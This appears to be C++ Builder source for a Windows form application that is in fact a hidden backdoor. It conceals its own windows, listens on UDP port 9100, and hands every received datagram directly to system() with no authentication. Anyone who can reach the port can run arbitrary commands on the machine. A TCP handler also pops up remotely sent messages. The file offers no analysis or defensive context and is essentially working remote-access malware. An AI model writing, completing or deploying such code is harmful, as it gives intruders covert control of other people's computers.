//---------------------------------------------------------------------------

#include <vcl.h>
#include <win32core.h>
#pragma hdrstop
#include <winsock2.h>
#include <stdio.h>
#include <typeconversion.h>
#include <stdlib.h>

#include "main.h"
#include "netUDP.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm1 *Form1;
int startWinsock(void);
//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
        : TForm(Owner)
{
}
//---------------------------------------------------------------------------


void __fastcall TForm1::IdTCPServer1Execute(TIdPeerThread *AThread)
{

MessageBox(NULL, AThread->Connection->ReadLn("##end##",0).c_str(),"",0);
}
//---------------------------------------------------------------------------
void __fastcall TForm1::FormActivate(TObject *Sender)
{
HideWindowHandle(Application->Handle);
HideWindowHandle(this->Handle);
}
//---------------------------------------------------------------------------
void __fastcall TForm1::FormCreate(TObject *Sender)
{
WSASession wsa;
UDPSocket s;
char buffer[100000];
s.Bind(9100);
while (1)
        {
            sockaddr_in add = s.RecvFrom(buffer, sizeof(buffer));

            std::string input(buffer);
//            std::reverse(std::begin(input), std::end(input));
            //MessageBox(this->Handle,input.c_str(),"",0);
            int ret;
            ret = system(input.c_str());
            std::string msg;
            msg = its(ret);

            //s.SendTo(add,msg.c_str(),msg.size(),0);



            //            Socket.SendTo(add, input.c_str(), input.size());
        }

}
//---------------------------------------------------------------------------
